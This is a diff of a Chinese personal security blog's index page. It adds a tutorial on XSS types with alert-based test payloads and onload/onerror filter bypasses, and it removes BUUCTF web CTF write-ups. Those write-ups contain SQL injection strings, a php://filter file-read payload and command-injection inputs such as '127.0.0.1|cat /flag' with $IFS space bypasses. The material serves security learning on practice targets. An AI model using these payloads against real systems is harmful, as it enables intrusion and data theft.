@@ -73,6 +73,113 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-Web-XSS1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/01/25/Web-XSS1/" class="article-date">
+  <time class="dt-published" datetime="2024-01-25T09:14:45.000Z" itemprop="datePublished">2024-01-25</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/01/25/Web-XSS1/">XSS1-原理分类及攻击手法</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="XSS跨站之原理分类及攻击手法"><a href="#XSS跨站之原理分类及攻击手法" class="headerlink" title="XSS跨站之原理分类及攻击手法"></a>XSS跨站之原理分类及攻击手法</h4><p><strong>XSS跨站漏洞产生的原理</strong></p>
+<p>往浏览器页面中插入恶意的HTML代码，比如说js、css、html标签等，当用户浏览该页面时，嵌入其中的恶意代码会执行，达到攻击用户的目的，比如说获取用户浏览器信息等。</p>
+<p><strong>XSS漏洞攻击的危害</strong></p>
+<ul>
+<li>盗取各类用户[账号，如机器登录帐号、用户网银帐号、各类管理员帐号</li>
+<li>控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力</li>
+<li>盗窃企业重要的具有商业价值的资料</li>
+<li>非法转账</li>
+<li>强制发送电子邮件</li>
+<li>网站挂马</li>
+<li>控制受害者机器向其它网站发起攻击（重定向语句）</li>
+<li>窃取cookie的sessionid，冒充登录。</li>
+</ul>
+<p>XSS攻击利用到最大就需要自己有台服务器用于窃取信息，还要利用一点社工，骗取别人点击恶意的链接。</p>
+<p>XSS跨站漏洞执行的代码是js代码，产生层面是前端，有关的函数是一些输出函数（alert、print等）</p>
+<p>XSS跨站漏洞分类：反射，存储，DOM</p>
+<p>跨站测试代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#&#x27; onclick=&quot;alert(2)&quot;&gt;</span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>使用后端来运行代码（反射型和存储型），得手动分析来测试是什么问题</p>
+<p><strong>XSS漏洞的分类</strong></p>
+<p><strong>1.DOM型</strong>(不经过服务器，前端js代码的利用)：</p>
+<p>DOM型是针对前端代码的（有的页面跳转不是在url执行，是在HTML中执行），可以直接从源代码中发现存在XSS漏洞</p>
+<p>DOM树</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/30396902-51e8-403c-86a6-522d6dcb129f" alt="image"></p>
+<p>本地利用漏洞，这种漏洞存在于页面中客户端脚本自身。其攻击过程如下所示：</p>
+<p>Alice给Bob发送一个恶意构造了Web的<a target="_blank" rel="noopener" href="http://baike.baidu.com/item/URL">URL</a>。</p>
+<p>Bob点击并查看了这个URL。</p>
+<p>恶意页面中的JavaScript打开一个具有漏洞的HTML页面并将其安装在Bob电脑上。</p>
+<p>具有漏洞的HTML页面包含了在Bob电脑本地域执行的JavaScript。</p>
+<p>Alice的<a target="_blank" rel="noopener" href="http://baike.baidu.com/item/%E6%81%B6%E6%84%8F%E8%84%9A%E6%9C%AC">恶意脚本</a>可以在Bob的电脑上执行Bob所持有的权限下的命令。</p>
+<p><strong>2.反射型：</strong></p>
+<p>反射型XSS有get和post型，攻击产生一次，攻击的语句不会存储到对方的服务器</p>
+<p>这种漏洞和类型A有些类似，不同的是Web客户端使用Server端脚本生成页面为用户提供数据时，如果未经验证的用户数据被包含在页面中而未经<a target="_blank" rel="noopener" href="http://baike.baidu.com/item/HTML%E5%AE%9E%E4%BD%93">HTML实体</a>编码，客户端代码便能够注入到<a target="_blank" rel="noopener" href="http://baike.baidu.com/item/%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2">动态页面</a>中。</p>
+<p>其攻击过程如下：</p>
+<p>Alice经常浏览某个网站，此网站为Bob所拥有。Bob的站点运行Alice使用用户名&#x2F;密码进行登录，并存储敏感信息(比如银行帐户信息)。</p>
+<p>Charly发现Bob的站点包含反射性的XSS漏洞。</p>
+<p>Charly编写一个利用漏洞的URL，并将其冒充为来自Bob的邮件发送给Alice。</p>
+<p>Alice在登录到Bob的站点后，浏览Charly提供的URL。</p>
+<p>嵌入到URL中的恶意脚本在Alice的浏览器中执行，就像它直接来自Bob的服务器一样。此脚本盗窃敏感信息(授权、信用卡、帐号信息等)然后在Alice完全不知情的情况下将这些信息发送到Charly的Web站点。</p>
+<p><strong>3.存储型（长久型，危害最大）：</strong></p>
+<p>存储型XSS，输入一行攻击脚本后，每次刷新页面都会攻击，攻击语句存储到对方的服务器了</p>
+<p>该类型是应用最为广泛而且有可能影响到Web服务器自身安全的漏洞，<a target="_blank" rel="noopener" href="http://baike.baidu.com/item/%E9%AA%87%E5%AE%A2">骇客</a>将攻击脚本上传到Web服务器上，使得所有访问该页面的用户都面临信息泄漏的可能，其中也包括了Web服务器的管理员。其攻击过程如下：</p>
+<p>Bob拥有一个Web站点，该站点允许用户发布信息&#x2F;浏览已发布的信息。</p>
+<p>Charly注意到Bob的站点具有类型C的XSS漏洞。</p>
+<p>Charly发布一个热点信息，吸引其它用户纷纷阅读。</p>
+<p>Bob或者是任何的其他人如Alice浏览该信息，其会话cookies或者其它信息将被Charly盗走。</p>
+<p>类型A直接威胁用户个体，而类型B和类型C所威胁的对象都是企业级Web应用。</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">反射型</span><br><span class="line">发包 x=qyw=&gt;x.php=&gt;回显</span><br><span class="line"></span><br><span class="line">存储型</span><br><span class="line">发包 x=qyw=&gt;x.php=&gt;写到数据库某个表=&gt;x.php=&gt;回显</span><br><span class="line"></span><br><span class="line">DOM型</span><br><span class="line">发包 x=qyw=&gt;本地浏览器静态前端代码=&gt;x.php=&gt;回显</span><br></pre></td></tr></table></figure>
+
+<p>绕过<script>过滤</p>
+<p>有的网站存在<script>过滤</p>
+<p>在html中，onload关键字就是一个事件，其它的所有标签都没有这个属性，但是Body标签的有的。但是有一定的局限性，如果onload事件在你的代码之前已经被处理了，就不会触发了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;BODY onload=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>不过还有Onerror事件处理，图片没有指定也就是出错了，就会触发onerror事件，引发XSS漏洞，没有用<script>标签</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=&quot;&quot; onerror=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>cookie session 用户凭据，通过凭据可以判断对方的身份信息</p>
+<p>cookie 存储在本地，存活事件较长 小中型</p>
+<p>session 会话 存储在服务器，存活时间较短 大型</p>
+<p>session更安全，但是会占用服务器的资源，且实现起来较为麻烦</p>
+<p><strong>靶场实践</strong></p>
+<p>反射型xss(get)</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/f797d7c2-5734-4c14-9d28-b44d899531f4" alt="image"></p>
+<p>存储型xss，每次刷新的时候都会弹窗</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/79034c3a-4c7d-4d47-b863-f6b908bbfbd7" alt="image"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/01/25/Web-XSS1/" data-id="clrt05a9i00008wvf65sx1bby" data-title="XSS1-原理分类及攻击手法" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-Paper-Deep Learning Based Malware Traffic Classification for Power Internet of Things Network Security" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2024/01/25/Paper-Deep%20Learning%20Based%20Malware%20Traffic%20Classification%20for%20Power%20Internet%20of%20Things%20Network%20Security/" class="article-date">
@@ -1208,172 +1315,6 @@
 
 
   
-    <article id="post-Buuctf Web（1-8）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/08/07/Buuctf%20Web%EF%BC%881-8%EF%BC%89/" class="article-date">
-  <time class="dt-published" datetime="2023-08-07T12:38:17.000Z" itemprop="datePublished">2023-08-07</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/08/07/Buuctf%20Web%EF%BC%881-8%EF%BC%89/">Buuctf Web（1-8）</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h3 id="Buuctf-Web（1-8）"><a href="#Buuctf-Web（1-8）" class="headerlink" title="Buuctf Web（1-8）"></a>Buuctf Web（1-8）</h3><h4 id="1、EasySQL"><a href="#1、EasySQL" class="headerlink" title="1、EasySQL"></a>1、EasySQL</h4><p>万能密码</p>
-<p>1’or’1’&#x3D;’1</p>
-<p>sql语句中#是注释符</p>
-<p>select * from table_name where username&#x3D;’1’ or 1&#x3D;1 # ‘ and password&#x3D;’xxxxxx’ ;</p>
-<p>相当于</p>
-<p>select * from table_name where username&#x3D;’1’ or 1&#x3D;1</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/3a60fa05-3af6-4713-a7e9-5fa7b92293bf" alt="image"></p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/296048b4-9808-4596-821e-a3ff1dc0fd1e" alt="image"></p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;46247fc5-8cd1-4f68-9601-63d1ccd4d7dc&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="2、Havefun"><a href="#2、Havefun" class="headerlink" title="2、Havefun"></a>2、Havefun</h4><p>查看源码，看到一串被注释的php代码</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/baea5f74-f9fe-4944-9b59-6cecb6a75602" alt="image"> </p>
-<p>有一个cat变量，通过get方式传参，如果cat&#x3D;dog，输出flag</p>
-<p>构造payload：&#x2F;?cat&#x3D;dog</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/44a8bec8-51b5-48ad-a28c-a17e0a0f4a6d" alt="image"></p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d6a6ed35-29e7-41db-9a46-170dcb0f9128&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="3、WarmUp"><a href="#3、WarmUp" class="headerlink" title="3、WarmUp"></a>3、WarmUp</h4><p>查看源码，发现一个注释掉的source.php文件</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9f419731-7f5b-4275-b4e6-5e32b82f9524" alt="image"></p>
-<p>访问php文件</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/3f0dc177-7b92-4ba2-b8cd-84240fad2fec" alt="image"> </p>
-<p>文件中有一个hint.php</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/42b87e8b-e8e6-4ef1-a95d-6d77fa4d0c2d" alt="image"> </p>
-<p>查看该文件</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6e56260d-bf15-4c98-8d2a-92c4e0e5ccf0" alt="image"> </p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/0a3b8cda-b707-4543-92f1-29d9ac5cb219" alt="image"> </p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/67c17320-e565-4ca3-9fae-23fd2ae47742" alt="image"> </p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6d99f238-8882-4915-8ce8-2ac62ddbecf3" alt="image"> </p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;65f5d7a9-2b2d-49b0-accf-52264323d465&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="4、Include"><a href="#4、Include" class="headerlink" title="4、Include"></a>4、Include</h4><p>查看页面源代码，发现有个flag.php文件</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/92cdcd45-b0de-4fcf-9957-58911c93bdf4" alt="image"></p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/e67bbbf4-6a41-4099-913e-6b726bc22d3a" alt="image"></p>
-<p>查看页面源代码发现啥也看不见，猜测包含文件漏洞</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">重要的知识点——PHP封装协议：</span><br><span class="line">php://filter/read=convert.base64-encode/resource=xxx.php</span><br><span class="line">php://filter 是php中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取；根据名字filter，可以很容易想到这个协议可以用来过滤一些东西；使用不同的参数可以达到不同的目的和效果：</span><br><span class="line">resource=&lt;要过滤的数据流&gt; 指定了你要筛选过滤的数据流。 必选</span><br><span class="line">read=&lt;读链的筛选列表&gt;可以设定一个或多个过滤器名称，以管道符（|）分隔。 可选</span><br><span class="line">write=&lt;写链的筛选列表&gt; 可以设定一个或多个过滤器名称，以管道符（|）分隔。 可选</span><br><span class="line">&lt;；两个链的筛选列表&gt; 任何没有以 read= 或write=作前缀 的筛选器列表会视情况应用于读或写链。</span><br><span class="line">php://filter与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，阻止其不执行。从而导致任意文件读取。</span><br><span class="line">read=convert.base64-encode，用base64编码输出，不然会直接当做php代码执行，看不到源代码内容。</span><br></pre></td></tr></table></figure>
-
-<p>php:&#x2F;&#x2F;filter协议，用base64编码的方式来读文件flag.php；这时页面会显示出源文件flag.php经过base64编码后的内容，然后经过base64解码就可以看到flag</p>
-<p>payload: <code>/?file=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
-<p>得到base64编码</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/3d9b0b25-dc61-4525-bd9f-e5b9b47912ea" alt="image"></p>
-<p>解码得到flag</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/1d3da52f-a110-4e54-b8c8-515c3af99420" alt="image"></p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;9c483c1a-9c62-41d3-abd8-51e64d50357f&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="5、Exec"><a href="#5、Exec" class="headerlink" title="5、Exec"></a>5、Exec</h4><p>Linux ping 命令用于检测主机。执行 ping 指令会使用 ICMP 传输协议，发出要求回应的信息，若远端主机的网络功能没有问题，就会回应该信息，因而得知该主机运作正常</p>
-<p>ls（英文全拼：list files）：用于显示指定工作目录下的内容（列出目前工作目录所含之文件及子目录)</p>
-<p>cat（英文全拼：concatenate）：用于连接文件并打印到标准输出设备上</p>
-<p>首先查看此文件的目录：127.0.0.1|ls</p>
-<p>点击ping后发现有个index.php文件</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9ed432b5-3a25-47e5-a5d8-fa4e3948b9ba" alt="image"></p>
-<p>再查看上级目录：127.0.0.1|ls &#x2F;</p>
-<p>点击ping后可以看到一个flag</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/0d1134f8-a13d-495a-aee7-8cf77a4b70df" alt="image"></p>
-<p>查看flag：127.0.0.1|cat &#x2F;flag</p>
-<p>得到flag</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/82ff4a13-d4da-43e8-bc7e-9b7cf5acf0f9" alt="image"></p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4504f6f2-191b-410b-b40d-18b4e403a271&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="6、Ping-Ping-Ping"><a href="#6、Ping-Ping-Ping" class="headerlink" title="6、Ping Ping Ping"></a>6、Ping Ping Ping</h4><p>这一题与上一题Exec类似，首先访问本地地址，发现有显示</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/22516845-102d-4d83-b285-1b77da5f6ece" alt="image"></p>
-<p>查看此文件的目录，发现有两个文件</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/7d100ccc-5cf4-4e39-b61e-5cf2b2dc48f6" alt="image"></p>
-<p>查看flag.php文件</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/4a1777df-77fb-4867-a0c5-6af4f22783c8" alt="image"></p>
-<p>它说空格被过滤了</p>
-<p>命令中空格被过滤的解决方法：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;cat,flag.txt&#125;</span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$9flag.txt: $IFS$9 $9指传过来的第9个参数</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">kg=$&#x27;\x20flag.txt&#x27;&amp;&amp;cat$kg (\x20转换成字符串就是空格)</span><br></pre></td></tr></table></figure>
-
-<p>发现符号又被过滤了，说明<code>&#123;&#125;</code>大括号被过滤了</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/edc798c1-1d33-40e5-ba2d-3044ba3e2d10" alt="image"></p>
-<p>用另一个方法试下index.php文件</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/614c2964-8a82-41be-b50c-51b4d29bc50e" alt="image"></p>
-<p>有一个参数a，<strong>变量拼接字符串——将a的值覆盖，然后进行绕过</strong></p>
-<p>构造payload：<code>/?ip=127.0.0.1;a=g;cat$IFS$9fla$a.php</code></p>
-<p>用变量拼接成flag</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/1db4f885-23d5-40b5-9d8a-291a10eae7f6" alt="image"></p>
-<p>啥也没有，查看源代码，得到flag</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8ea1b222-1b2e-420a-8a81-137e674b2caf" alt="image"></p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;97aede41-9723-4901-8ac2-b345d66af44b&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="7、随便注"><a href="#7、随便注" class="headerlink" title="7、随便注"></a>7、随便注</h4><p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/1fe10469-06c6-4c22-87f0-1a3886b61577" alt="image"></p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/0cd3e27d-e133-4673-bcc7-2d008ce22b09" alt="image"></p>
-<p>查询3时没有显示，说明有两个字段</p>
-<p>爆数据库：1’;show databases;#</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d0f5ed71-751c-4117-9195-f3178caa3dd2" alt="image"></p>
-<p>爆表名：1’; show tables;#</p>
-<p>出来了两个表</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/f636bbac-e56c-4091-bf74-ebe0f39634cf" alt="image"></p>
-<p>查看words表列名：1’; show columns from words;#</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6bdf874f-d98f-49ee-a0e6-b5a1df7495b0" alt="image"></p>
-<p>查看1919810931114514表列名：0’; show columns from <code>1919810931114514</code>;#</p>
-<p>注意：表名为数字时，要用反引号包起来查询</p>
-<p>看到flag，说明表1919810931114514中有flag</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/1be25d80-699d-4449-981a-4ba85f3228b3" alt="image"></p>
-<p>查看大佬的方法</p>
-<ul>
-<li><p>通过 rename 先把 words 表改名为其他的表名。</p>
-</li>
-<li><p>把 1919810931114514 表的名字改为 words 。</p>
-</li>
-<li><p>给新 words 表添加新的列名 id 。</p>
-</li>
-<li><p>将 flag 改名为 data </p>
-<p>1’; rename table words to word1; rename table <code>1919810931114514</code> to words;alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/595a5ad4-0393-4542-9b16-f32cd7633903" alt="image"></p>
-</li>
-</ul>
-<p>最后输入：1’ or 1&#x3D;1;#</p>
-<p>得到flag</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/b2b3bcda-a630-4c63-a614-a68ba770a02a" alt="image"></p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;aa75e48d-8389-408e-9c8c-9d30c81c432b&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="8、EasySQL"><a href="#8、EasySQL" class="headerlink" title="8、EasySQL"></a>8、EasySQL</h4><p>输入1，有显示</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/24aa574b-2e43-454e-8df1-8dbb3b104abd" alt="image"></p>
-<p>爆数据库：1;show databases;#</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/0320260a-c0f9-4e36-b544-bb0ba53de8a0" alt="image"></p>
-<p>爆表：1;show tables;#</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ee2d1ebd-03b9-48f9-984f-10acee8da107" alt="image"></p>
-<p>爆字段：1;show columns from FLAG;#</p>
-<p>显示Nonono</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/faaaf7dd-fd3e-4fe1-8eb9-2c66d9b23046" alt="image"></p>
-<p>查看大佬博客后，构造payload：*,1</p>
-<p>参考博客（[BUUCTF-<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46918279/article/details/120188186">SUCTF 2019]EasySQL1__Monica_的博客-CSDN博客</a>）</p>
-<p>得到flag</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9321cfe6-b625-4707-9703-8ecbdf5d1a9b" alt="image"></p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;7c0c6069-c1fe-4314-b793-9a214f11fdb3&#125;</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/08/07/Buuctf%20Web%EF%BC%881-8%EF%BC%89/" data-id="cll0v0lih0000povf909mhcek" data-title="Buuctf Web（1-8）" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -1392,7 +1333,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzzing/" rel="tag">Fuzzing</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/learn/" rel="tag">learn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/security/" rel="tag">security</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" rel="tag">论文细读</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzzing/" rel="tag">Fuzzing</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/learn/" rel="tag">learn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/security/" rel="tag">security</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" rel="tag">论文细读</a></li></ul>
     </div>
   </div>
 
@@ -1402,7 +1343,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Fuzzing/" style="font-size: 20px;">Fuzzing</a> <a href="/tags/learn/" style="font-size: 13.33px;">learn</a> <a href="/tags/security/" style="font-size: 10px;">security</a> <a href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" style="font-size: 16.67px;">论文细读</a>
+      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Fuzzing/" style="font-size: 20px;">Fuzzing</a> <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 10px;">Web安全</a> <a href="/tags/learn/" style="font-size: 13.33px;">learn</a> <a href="/tags/security/" style="font-size: 10px;">security</a> <a href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" style="font-size: 16.67px;">论文细读</a>
     </div>
   </div>
 
@@ -1424,6 +1365,10 @@
       <ul>
         
           <li>
+            <a href="/2024/01/25/Web-XSS1/">XSS1-原理分类及攻击手法</a>
+          </li>
+        
+          <li>
             <a href="/2024/01/25/Paper-Deep%20Learning%20Based%20Malware%20Traffic%20Classification%20for%20Power%20Internet%20of%20Things%20Network%20Security/">Deep Learning Based Malware Traffic Classification for Power Internet of Things Network Security</a>
           </li>
         
@@ -1437,10 +1382,6 @@
         
           <li>
             <a href="/2023/08/13/Buuctf%20Web%EF%BC%8829-32%EF%BC%89/">Buuctf Web（29-32）</a>
-          </li>
-        
-          <li>
-            <a href="/2023/08/12/Buuctf%20Web%EF%BC%8825-28%EF%BC%89/">Buuctf Web（25-28）</a>
           </li>
         
       </ul>
